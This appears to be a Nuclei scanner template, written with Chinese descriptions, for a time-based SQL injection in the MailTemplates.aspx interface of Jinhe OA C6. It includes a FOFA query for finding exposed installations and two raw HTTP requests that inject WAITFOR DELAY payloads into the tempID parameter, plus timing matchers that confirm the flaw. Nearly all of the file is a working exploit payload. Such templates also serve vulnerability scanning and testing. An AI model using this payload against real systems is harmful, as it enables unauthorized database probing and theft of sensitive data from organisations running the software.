id: jinhe-oa-c6jhsoft-websql-time-based-sqli
info:
  name: "金和 OA C6JHSoft MailTemplates.aspx 接口基于时间延迟的 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app:"金和 C6 协同管理平台"
        金和OA C6JHSoft系统的MailTemplates.aspx接口存在基于时间延迟的SQL注入漏洞。攻击者可通过构造恶意SQL语句触发数据库延时响应，从而推断数据库结构并获取服务器敏感数据。
  tags: 金和OA
http:
- raw:
  - |
    GET /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%3BWAITFOR+DELAY+%270%3A0%3A6%27-- HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ASP.NET_SessionId=xlbkb5a0zyt1mwrhly42bhbr; myie=false
    Connection: close
  - |
    GET /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1%3BWAITFOR+DELAY+%270%3A0%3A8%27-- HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: ASP.NET_SessionId=xlbkb5a0zyt1mwrhly42bhbr; myie=false
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=6 && duration_1<=7
    - duration_2>=8 && duration_2<=9
    condition: and
